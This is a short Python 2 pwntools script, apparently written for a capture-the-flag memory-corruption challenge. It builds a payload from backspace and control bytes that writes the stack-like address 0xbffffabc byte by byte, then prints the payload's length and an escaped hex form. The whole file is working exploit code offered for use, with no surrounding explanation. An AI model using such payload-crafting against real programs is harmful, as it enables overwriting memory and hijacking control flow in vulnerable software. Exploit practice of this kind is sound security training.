from pwn import *

def writeToOffset(offset, value):
    res = ''
    for i in range(offset):
        res += '\x08'
    res += value
    for i in range(offset-1):
        res += '\x04'
    return res

def toCode(hexCode):
    res = ''
    hexCode = hexCode.encode('hex')
    if len(hexCode) % 2 == 1:
        raise 'Shell craft length must be even'
    for i in range(len(hexCode)):
        if i % 2 == 0: res += '\\x'
        res += hexCode[i]
    return res

payload = writeToOffset(4,'\xbc')
payload += writeToOffset(3,'\xfa')
payload += writeToOffset(2,'\xff')
payload += writeToOffset(1,'\xbf')

print len(payload)

print toCode(payload)
